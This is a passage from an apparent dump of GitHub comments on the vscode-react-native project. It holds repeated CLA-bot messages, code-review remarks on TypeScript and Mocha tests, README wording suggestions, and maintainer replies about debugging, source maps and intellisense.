humans will now evaluate your PR.\n    \nTTYL, MSBOT;\n. Hi @BretJohnson, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Bret Johnson). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @vladimir-kotikov, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Vladimir Kotikov). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. @vladimir-kotikov, Thanks for signing the contribution license agreement so quickly! Actual humans will now validate the agreement and then evaluate the PR.\nThanks, MSBOT;\n. Hi @daserge, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Sergey Shakhnazarov (Akvelon)). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @vladimir-kotikov, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Vladimir Kotikov). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. @vladimir-kotikov, Thanks for signing the contribution license agreement so quickly! Actual humans will now validate the agreement and then evaluate the PR.\nThanks, MSBOT;\n. Hi @vladimir-kotikov, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Vladimir Kotikov). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @vladimir-kotikov, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Vladimir Kotikov). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @alsorokin, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        In order for us to evaluate and accept your PR, we ask that you sign a contribution license agreement. It's all electronic and will take just minutes. I promise there's no faxing. https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @alsorokin, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        In order for us to evaluate and accept your PR, we ask that you sign a contribution license agreement. It's all electronic and will take just minutes. I promise there's no faxing. https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @alsorokin, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        In order for us to evaluate and accept your PR, we ask that you sign a contribution license agreement. It's all electronic and will take just minutes. I promise there's no faxing. https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @alsorokin, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Alexander Sorokin (Akvelon)). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @alsorokin, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Alexander Sorokin (Akvelon)). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @Jacse, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        This seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. Real humans will now evaluate your PR.\n    \nTTYL, MSBOT;\n. Hi @matrosov-nikita, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Nikita Matrosov (Akvelon)). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @matrosov-nikita, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Nikita Matrosov (Akvelon)). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @matrosov-nikita, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor. If you're full-time or an intern, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. \n@matrosov-nikita,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@nathanpiper,\nThanks for your contribution.\nTo ensure that the project team has proper rights to use your work, please complete the Contribution License Agreement at https://cla.microsoft.com.\nIt will cover your contributions to all Microsoft-managed open source projects.\nThanks,\nMicrosoft Pull Request Bot. @nathanpiper, thanks for signing the contribution license agreement. We will now validate the agreement and then the pull request.\nThanks, Microsoft Pull Request Bot. \n@matrosov-nikita,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@matrosov-nikita,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \nThis seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. We will now review your pull request.\nThanks,\nMicrosoft Pull Request Bot. \n@matrosov-nikita,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \nThis seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. We will now review your pull request.\nThanks,\nMicrosoft Pull Request Bot. \n@TomSwift,\nThanks for having already signed the Contribution License Agreement. Your agreement has not been validated yet. We will now review your pull request.\nThanks,\nMicrosoft Pull Request Bot. \nThis seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. We will now review your pull request.\nThanks,\nMicrosoft Pull Request Bot. \n@atlanteh,\nThanks for your contribution.\nTo ensure that the project team has proper rights to use your work, please complete the Contribution License Agreement at https://cla.microsoft.com.\nIt will cover your contributions to all Microsoft-managed open source projects.\nThanks,\nMicrosoft Pull Request Bot. @atlanteh, thanks for signing the contribution license agreement. We will now validate the agreement and then the pull request.\nThanks, Microsoft Pull Request Bot. \nThis seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. We will now review your pull request.\nThanks,\nMicrosoft Pull Request Bot. \nThis seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. We will now review your pull request.\nThanks,\nMicrosoft Pull Request Bot. \n@terbooter,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@terbooter,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@terbooter,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@terbooter,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \nThis seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. We will now review your pull request.\nThanks,\nMicrosoft Pull Request Bot. \n@hnq90,\nThanks for your contribution.\nTo ensure that the project team has proper rights to use your work, please complete the Contribution License Agreement at https://cla.microsoft.com.\nIt will cover your contributions to all Microsoft-managed open source projects.\nThanks,\nMicrosoft Pull Request Bot. @hnq90, thanks for signing the contribution license agreement. We will now validate the agreement and then the pull request.\nThanks, Microsoft Pull Request Bot. \nThis seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. We will now review your pull request.\nThanks,\nMicrosoft Pull Request Bot. @iTOYS, thanks for signing the contribution license agreement. We will now validate the agreement and then the pull request.\nThanks, Microsoft Pull Request Bot. \n@iTOYS,\nThanks for having already signed the Contribution License Agreement. Your agreement was validated by Microsoft. We will now review your pull request.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for having already signed the Contribution License Agreement. Your agreement was validated by Microsoft. We will now review your pull request.\nThanks,\nMicrosoft Pull Request Bot. \nThis seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. We will now review your pull request.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot.  All CLA requirements met.. \n@iTOYS,\nThanks for your contribution as a Microsoft full-time employee or intern. You do not need to sign a CLA.\nThanks,\nMicrosoft Pull Request Bot.  All CLA requirements met..  All CLA requirements met..  All CLA requirements met..  All CLA requirements met.. ",
    "guillaumejenkins": "Looks good otherwise :+1: \n. Looks good to me\n. Looks good\n. Ah yes, I had forgotten to change the .gitignore :)\nLooks good\n. Otherwise looks good!\n. Looks good\n. Looks good\n. Looks good\n. Looks good, the commas still look a bit weird to me, but if the rest of the team agrees then I don't mind\n. Looks good!\n. Looks good to me if the others agree with me on the naming issue\n. Otherwise looks good!\n. Looks good to me if we agree to leave debug as the default build when doing gulp. I think it's fine, given that package defaults to prod.\n. :+1: \n. :+1: other than that... great tool!\n. :+1: \n. Looks good!\n. Looks good! Have we done some \"end-to-end\" testing of this? I know we can't look at the real telemetry data yet, but have we tried inspecting the outgoing telemetry messages to see if they make sense?\n. The rest looks good to me!\n. I sign off provided that we're fine with not allowing the done callback in Mocha tests\n. Looks good\n. Looks good\n. Looks good!\n. There were a few tslint errors which caused the automated build to fail, reporting them here for convenience:\n[gulp-tslint] error (no-trailing-whitespace) src/debugger/nodeDebugWrapper.ts[164, 1]: trailing whitespace\n[gulp-tslint] error (no-trailing-whitespace) src/debugger/nodeDebugWrapper.ts[168, 1]: trailing whitespace\n[gulp-tslint] error (quotemark) src/debugger/scriptImporter.ts[75, 99]: ' should be \"\n[gulp-tslint] error (quotemark) src/debugger/scriptImporter.ts[86, 118]: ' should be \"\n. I'd be in favor of using message.toString() directly if that's our intention. I think it's clearer.\n. \"...that currently works only if the packager...\"\n. Just a comment so that we don't forget these TODOs\n. \"...you will see the following prompt...\"\n. \"...by following the above steps...\"\n. \"...Our / This extension installs...\"\n. \"...Our / This extension drops...\"\n. Just a comment so we don't forget these TODOs\n. Is there a strong reason for not using the Sync API here? I feel like statSync, existsSync and readdirSync would make this much clearer\n. Is there no other way to \"cast\" a promise to void?\n. Yes; when running the tests via \"npm test\", VSCode's default test launcher uses this folder.\n. You are right, I added the build preLaunchTask to the Launch Tests config\n. \"test\" is a convention in most test frameworks, I think we should leave it like that\n. There may be small semantic differences in the approach of BDD vs TDD in general, as discussed in this SO question, but as far as Mocha test authoring is concerned, they function pretty much identically. \nThe only difference is in the name of the different methods:\n\nThe BDD interface provides describe(), it(), before(), after(), beforeEach(), and afterEach().\nThe TDD interface provides suite(), test(), suiteSetup(), suiteTeardown(), setup(), and teardown().\n. According to our convention, I think this should be IInstallProps (missing an I)\n. For some reason Github marked my previous comment as outdated... Here it is again:\n\nAccording to our convention, I think this should be IInstallProps (missing an I)\n. Is there an advantage to using os.type() instead of os.platform() (which returns \"win32\" for Windows)?\n. Should we give an error / warning in the Linux case (or any other case) in an else at the end here? Right now it seems like on Linux we are just spawning a child_process with an empty command\n. I find this initialization a little misleading; the value \"extensionContext\" is never used. Are you trying to use that pattern by default? If yes, this might be a bug right now, because if --pattern is not specified on the command line, readArgument() sets this to null\n. Would it be good to see this even for the default pattern? Just so that it's clearer if we're quickly reading the log\n. I think it's ok as is. For instance variables it makes sense to me to rename child_process to childProcess, so the import can stay as child_process without conflicts. In case of a conflict like for fs, I prefer doing the rename at the import variable, since that is only used once in the entire file. I think that makes the rest of the file more readable (this.fs as opposed to this.[prefix]Fs). That's just my opinion though :)\n. If we're going to put commas at the end of our arrays / objects, you should add one here :)\n. Add comma here?\n. Here as well\n. Ah, right\n. Is this comment still relevant?\n. Minor spacing issue\n. Same here\n. Should new Node.ChildProcess() be in an instance variable to be consistent with the other files in this PR?\n. I think the NodeJS typings for child_process already have the full interface definition for these options, so you shouldn't have to define your own\n. If you end up not using the NodeJS built-in interface, I think you should at least reuse the ISpawnOptions you defined in recording.ts (you already import the ISpawnArguments interface from that file)\n. Sorry for the nit but could you merge this import with the other imports you already have from ./recording 2 lines below? :)\n. These 2 interfaces are pretty much the same thing... I would be inclined to have only 1 interface, and modify the constructor of Simulator to take 2 separate lists (one for whole output, one for single event). I think it would be much clearer that way, where the consumers would explicitly separate the 2\n. Maybe use a boolean flag inside the interface then? matchWholeOutput or something similar?\n. Empty interface? Is there a better design to achieve what you're trying to achieve? I think at this point it might be better to just have IDeviceStateMapping to map a string to an any\n. Ok\n. - Does this allow using the done callback?\n- What about the usage of the this keyword? For example, many tests use this.timeout = .... Does your approach allow that, or does it prevent accessing Mocha's this?\n- What about the Mocha hooks, beforeEach(), afterEach() etc? Will your approach work with these hooks?\n. the private keyword is used to implicitly generate a private member, correct? I'm not a big fan of this syntax, I think instance variables should be declared explicitly for better readability\n. Wait what? Why error out for the done callback? You need the done callback if you are doing async tests that are not returning a promise... If we agree as a team that we won't be doing such tests, then fine, but I think others should agree on this first\n. Unrelated to your changes but is this supposed to be stopMonitoringLogcat() (missing a \"g\")?\n. Can't you use your createAndroidPlatform() helper here?\n. Small nit: \"in exactly one of these three devices\"\n. Maybe change createAndLaunchAll() to take an array instead? That way, you can store the array locally in this test, and avoid recreating the array further below in this test. Makes it easier to change the tested device IDs in my opinion\n. Same comment about making this method take an array instead. Then the tests can use something like\n```\nlet offlineDevices = [\"Nexus_5\", \"Nexus_6\"];\nlet onlineDevices = [\"Nexus_10\", \"Nexus_11\"];\n...simulatedAVDManager.createAndLaunchAll(offlineDevices.concat(onlineDevices))\n...simulatedAVDManager.notifyDevicesAreOffline(offlineDevices)\n``\n. You can useonlineDevicesIdsthat you declare a few lines above :)\n. Minor typo in digeff's description:it'sshould beits. Minor typo / reword for digeff's description:It can be either such as an array->It can either be an array such as`\n. ",
    "panarasi": "Lgtm\n. +1 to the gray one- let us use that. \n. +1. I think we should do this work. \n. Today, react has log-android and log-ios commands. I would propose that we don't show logcat output inside the packager. Instead, the packager just shows its regular output. \nThere should be a separate command that can start log-ios and log-android from the tasks panel. \n. @sercanov We investigated this issue, and looks like in case of VSCode, you will have to type <\\ to get the end tags. VSCode does not seem to automatically insert the tag, and hence, this extension will not be able to add such a feature. \nI think this would be a great feature to have in VSCode. Can you please open a bug there? Feel free to refer to this bug on that issue. \nClosing this issue since there is not much this extension can do about the feature. \n. @MSLaguana Given that there is no action for this specific bug, should we close this bug for the extension ? \n. @forki Can you point us to the place in the tutorial where this is referred to ? We should go change that. \n. @forki Looks like this is an issue in the react-native documentation, and the code for that lives here - https://github.com/facebook/react-native/blob/master/docs/GettingStarted.md#dependencies-for-mac--android.\nCan you open an issue of PR in the facebook repos ? Closing this issue here since the text is not a part of this repo. Once you open an issue on that repo, please feel free to link it back to this issue. \n. @jmcginty We are currently looking into this. There does not seem to be much work we would need to do, and this is a planned work item. \n. @jmcginty This is the query we are using - https://github.com/Microsoft/vscode-react-native/labels/copiedtobacklog\n. VSCode now supports \"attaching\" to the Windows platform. For this workflow, you would now have to select \"Attach to packager\" in the debug options, and then put the windows react native app into debug mode. VSCode will automatically become the debugger. . @levito We were not able to repro this. Are you still seeing this issue ? \n. Should be a part of 252040\n. @faisalil I wanted to close this bug since the instructions on using VSCode with ReactNative is published at http://www.reactnative.tools/tutorials/2016/09/20/reactnative-ts/. \nPlease re-open if there are questions. \n. @MSLaguana What do you think about this proposal ? Doable ? \n. @MSLaguana Awesome, thanks. Let us copy this over to the backlog and schedule it as a work item. \n. @haitaoli We are currently looking into this. \n. @vladimir-kotikov  I don't think that this is a new feature. This looks like a bug to me that we should investigate. . @MSLaguana @vladimir-kotikov does VSCode not automatically download typings ? @nschurmann has a point that if typings are just for intellisense, is there any other way that VSCode can enable that, without adding to the typings folder ? \n. @vladimir-kotikov  - Do we know if there is a way to solve this issue ? I am also removing the enhancement tag since this is not a feature request yet. . @vladimir-kotikov Can you send a PR\u00a0of your changes to\u00a0my original repo, so that folks\u00a0who read the documentation have the latest updates?\u00a0\nAlso, can you explain the\u00a0commit about removing\u00a0sm-transformer ? I was using that to ensure that source maps created using typescripts were\u00a0available during debugging.\nAlso, I was using the Attach Packager command to debug, FWIW. . @vladimir-kotikov Do we have all the info we need to triage this bug ? . @vladimir-kotikov Just published the new version. Can you create a GitHub milestone and mark the issues as fixed ? . @GollyJer This should work with Windows 10. @vladimir-kotikov Could you please help? . I think these are excellent suggestions. Would it make sense to make these actions a separate extension, instead of bundling them into this extension ? That would make these additional features easier to maintain.\n@nonameolsson Would you be interested in creating an extension, and we could see if we can create a \"react-native-extension\" pack with all these extensions. . @vladimir-kotikov - I agree. However, can you add these commands during the debug process ? You would have to invoke them as a task, right ? Looking at each of the features \n\nOpen Android dev menu on emulator/device - Would this be in tasks.json ? I think adding this would be good. \nReload app : I think this would be a good addition to the tasks\n**Generate release/debug APK file - this is a pure build process, and is not a task that is as common. VSCode also has a terminal, so folks could use the terminal for this. IMHO, this is not a command that is common enough to be added to the extension\n**Create release React Native bundle for Android / iOS - same as above\n**Run on physical iOS device - For android, react-native already runs on a device, or an emulator, whichever is open. IMHO, for iOS, this should be something that makes sense as a part of react-native run command .\n**Run on selected iOS device\n**Open debugger-ui\n\n@vladimir-kotikov  - We should revisit the list of things that we have as tasks, and ensure that adding these things does not bloat it up. \n. I think we should leave this out. \n. We should add \"PREVIEW\" in the title\n. I think we should add pre-requisites section, something like \nPre-requisites\n\nVSCode - SPECIFY VSCODE VERSION on a Mac. \nreact-native-cli (SPECIFY VERSION) installed globally\nProjects that use React-Native (SPECIFY-VERSION)\n. How about changing this like to something like \nSet up ReactNative using the steps detailed on the ReactNative getting started documentation. \n. Instead of separating Intellisense into a \"setup\" section and a separate section about what intellisense is, can we combine them ? While I understand that you are saying - this is like a one time setup, I think having it in 2 places could be confusing. \n\nI think we should call this section, just \nIntellisense\nAlso, do we need an anchor ? I thought github always had anchors for all titles. \nThis should be a second level heading. \n. Instead of saying some technical reasons, can we given them what the reason is ? Something like \n\nCurrently, a newer version of typescript is required for intellisense in JSX files out of the box. This extension enables intellisense by enabling the newer version of typescript for your ReactNative projects. The first time you open a ReactNative project, the extension displays a prompt, asking you to install the required dependencies.\n. Suggestion\nOn clicking yes, the typescript SDK is downloaded and a tsconfig FIX THE FILENAME is added to your project to enable intellisense. Restart VS Code for the changes to take effect.\n. I am not sure if we need a separate section for intellisense. How about merging this with the section at top, and just calling them it intellisense ? We don't have much content here anyway. \n. Can this be a section that is a sibling to Intellisense and simply be called Debugging ? We could then have subtopics called setup, and start debugging ? \n. I think we should explain what this table is. I am not sure I understood. \n. Technically, we can also debug using an iOS device, but it is harder. How about we leave out this line, and instead move it to the section where we talk about \n\nDebug iOS device\n. Suggestion\n\nMore information about using debugging using VS Code can be found in this guide\n. Can we move this down to a section called known issues ? \n. Add a section about \n\nTroubleshooting, Known Issues\n. Add a section about how to contact us. We should emphasize here that this extension is in preview, and add details about how to contact us. \nIs there a channel using which Cordova folks contact us ? \n. Suggestion\n\nTo debug a ReactNative application using VS Code, the packager needs to be started using F5. If you already have a version of the packager running, debugging may not be enabled. \n. Should we also talk about what exactly happens, and how to disable this ? \n. Suggestion\nThe extension also makes common ReactNative commands available in the VS Code Command Palette. Hit F1 to open the Command Palette and start typing React Native to view a list of React Native commands. \n. Suggestion\nDisabling Telemetry reports\n. Should we say why we open IPhone5 during debugging and point to the facebook bug ? \n. @MSLaguana makes sense. In that case, let us define a stackoverflow tag that they should use. We should encourage them to submit an issue.\nAlso note that the community is active on discord, so we could ask to be pinged on discord too. \n. I agree with @nisheetjain \n. I think we could. \n\nWhile Windows is not yet supported, this is just the file that people see when sending a PR, so I think it should be fine. \n. I think we should have a top level, \"DEBUGGING\" as the title, and have \"Setup Debugging\" under it. \n. I liked the table structure we had earlier. It was a little confusing though. \n. Suggestion - remove isn't straightforward\n\nDebugging on iOS would require the following steps\n. Let us remove We use some smart tricks to enable React Native app debugging but that currently works only if packager is started by VS Code.\n\nHow about \n\nThe debugger only works if the packager is started by VS Code.\n. Let us remove Chances are that you have started the React Packager outside VS Code. Let us just say \nStop the packager if it is already running outside VSCode. \n. I think that may not be required. Would be too many details. \n. Should we move Troubleshooting under Known Issues instead ? \nI think we should also talk about Intellisense and command pallatte before talking about this. \n. This may not be Tl;Dr; since if does not really summarize the entire article. \n. \n",
    "vladimir-kotikov": "Closing this one as we're not maintaining own RN typings anymore and this issue is more approriate to be filled against DT repo. Thanks to @agrcrobles, steps to get flow intellisense working are now reflected in README. Closing this. @maximovicd, thanks for reporting. This is really an odd case, because it sounds like the extension is activated but debugger process somehow is not able to communicate with the extension process. \nAs a first step in order to get some additional debug information you could try setting up RN_LOG_LEVEL environment variable to Trace and then opening the project in new instance of VSCode and starting debugging session. This might produce some adidtional logs (either in devtools console or in output channel).\nAs for missing launchReactNative.js - that's okay if you're on version 0.3.0 of extension - this file is no more required to start debugger.. Tested this just now and logcat channel shows a message saying that ######### LogCat monitoring stopped because the debugging session finished ########## when I stop debugging so this looks like has been already implemented.. @Flavien, what instructions are you referring to? Could you please describe exact steps you have tried?. @MSLaguana, @mbraude, can we close this? This seems to be implemented and works perfectly for me.\n. We've managed to get a stable minimal repro case and sent it to nodejs team, so hopefully they will be able to reproduce and fix this on their end.\n@orta, @mennenia, as of now as a workaround we recommend to use either 4.x or 7.x NodeJS version (it appeared that 7.x is also unaffected by this bug and debugging works just fine)\n@mbraude, we can probably close this as there is nothing we can do at our end?\n. Running any \"React Native:*\" commands or starting debug session now shows an error message w/ explanation why the command has failed, so this probably can be closed.. Closing this as it looks pretty outdated. Also quick test shows that autocompletion is now available for all react-native exports (vscode 1.10). Looks like the fix has landed in react-native@0.35, but after additional testing this seems to be still an issue. Using rn@0.35 and rn@0.36 while debugging I see the following error in debug console:\nUnable to symbolicate stack trace: You attempted to set the key `file` with the value `\"http://localhost:8081/index.android.bundle?platform=android&dev=true&hot=false&minify=false\"` on an object that is meant to be immutable and has been frozen.\nand stack frames on device's screen are pointing to bundle file rather than actual file on disk.\nLooks like stack array that comes to symbolicateStackTrace is deeply frozen so we can't just change file field there - we need to copy frames into new array. I'm going to test the fix and sent another PR to react-native.\n. The PR has been merged in https://github.com/facebook/react-native/commit/0fe1c7a9ff84bb0d49a0fbe3de3d09d89bf1a785 so hopefully will be available in next version of react-native (0.37 is RC already so it might be in next after 0.37)\n. @MSLaguana, can we close this. Looks like there is nothing required from our side anymore.\n. > [Error : 0706]  Cannot debug application: Another debugger is already connected to packager. Please close it before trying to debug with VSCode.\n@preetb123, this sounds like you have a debugger tab opened in Chrome. Before starting new debug session please ensure that previous ones have been closed.\n. @dev-xdyang, @billti, a830751 should fix the problem with autocompleting properties.\nAs for 2 and 3 - the first is still a problem, even with the changes from a830751 It looks for me like a typescript issue, very similar to https://github.com/Microsoft/TypeScript/issues/11331\nThe second one probably has nothing to do with this extension - this is how VSCode displays a hint for function parameters. Hitting Esc once works for me - the hint disappears and is not being displayed anymore.\n. @MSLaguana, this should have been resolved by #306. Can we close this?\n. Relevant issue: https://github.com/Microsoft/vscode-node-debug/issues/97\n. @MSLaguana, it appeared that vscode test app was the culprit. Adding it to  excludes did the trick.\n. @forki, not that it is not compatible - I'd say it's not up to date with current react-native. Current typings were written to match react-native@0.29, so they might be a bit outdated if you're using 0.34.\nAlso, some of APIs were not covered by typings, and this PR fixes this problem too.\n. /cc @MSLaguana, @mbraude \n. @Mirodil, are you installing typings using tsd/typings/npm or trying to use the typings that are shipped with the extension? If latter, could you please try put this file to the root of the project and see if it works for you? \n. If intellisense doesn't work even after installing typings using typings command then it's probably has nothing to do with the extension - typescript engine should pick these typings automatically so you would get intellisense even without this extension installed.\n. @Mirodil, were you able to get intellisense working? Does it work in your project if you uninstall/disable this extension?\n. Well, since 0.2.2 it should work even without manual typings installation - we did some changes to install proper typings automatically. I would appreciate if you could confirm that. Thanks in advance.\n. Just for better understanding could you please attach a screenshot or code snippet where you can't see intellisense suggestions?\n. @DFelten, if you want to debug over wi-fi, make sure that you have specified your debug host IP and port in app's Developer menu -> Dev settings -> Debug server host & port. @gmaliandi, @Ruzo, were you guys trying to debug app that was connected through network, rather than cable?. > Dev Menu support: On the simulator, cmd-M will bring up the developer menu, just like on Android. To bring it up on a real Android TV device, press the menu button or long press the fast-forward button on the remote. (Please do not shake the Android TV device, that will not work :) )\nSee here: https://facebook.github.io/react-native/docs/building-for-apple-tv. @MSLaguana, thanks for review, updated.\n. @kidtsunami, @owenyang0, this is something that will not work out of the box - you'll need to tweak your project to make react-native consider sourcemaps produced by typescript when generating resultant bundle. Check this article for more details: http://www.reactnative.tools/tutorials/2016/09/20/reactnative-ts . You can also use this repo: https://github.com/panarasi/ReactNativeTS as a project template that supports  setting breakpoints in tsx files\n. Upd.: there is a PR mhzed/react-native-sm-transformer#1, that fixes some issues that are causing extension (and debugger) to fail breakpoints validation. Linking another relevant issue for cross-reference: #371 \n@MSLaguana, can we close both these issues? IMO there is nothing we can do here, unless we're not going to improve typescript support in the near future. @MSLaguana, yes, I'll investigate. I confirm, that adding \"inlineSourceMap\": true, does the trick. It looks like babel, when compiles the bundle, doesn't bother with reading source maps from disk (this is the case when \"sourceMap\":true and the map is stored in separate file) and completely ignores the fact that source js file was generated. However if source map is inlined, babel takes it to the final map.\nHowever, notice that the recipe above works only when you also have \"sourceRoot\" property in your tsconfig.json because otherwise typescript will produce maps with path to source, relative to js file and hence these paths will become invalid relative to final map file. Adding \"sourceRoot\" forces babel to calculate absolute paths to sources (which we will then recalculate and make relative to the downloaded bundle). @muccy, @saeedtabrizi, thanks for reporting. I confirm that I can see the same problem after upgrading to RN 0.42. I'll investigate and let you know if there are any solutions or  workarounds.. @ambientlight, Hmm, I think it's an undocumented feature so I doubt it's worth mentioning this in README.\nAlso posting here some investigation results. The functionality that was merging existing source maps w/ ones produced by react-native packager was broken in https://github.com/facebook/react-native/commit/0849f84df26e4c56f5763375363bae90d94015fe.\nSince this commit packager no longer uses babel's transform method (which has a special logic to merge source maps from original file w/ generated ones) to produce transpiled code and instead uses babel-generator's default generator directly.\nThe solution might be to reimplement this merging logic (as suggested by @alloy in https://github.com/facebook/react-native/issues/7083#issuecomment-284147710) in react-native's transformer but this would have some performance drawbacks, as merging process would use source-maps module, and that's what Facebook folks are trying to avoid.\nAlso linking https://github.com/facebook/react-native/issues/12705 as it's basically the same issue.. @ambientlight, you still could try an approach w/ passing custom transformer to post-process source maps - see http://www.reactnative.tools/tutorials/2016/09/20/reactnative-ts/, \"Enabling sourcemaps\" section and https://github.com/panarasi/ReactNativeTS/blob/master/package.json#L8 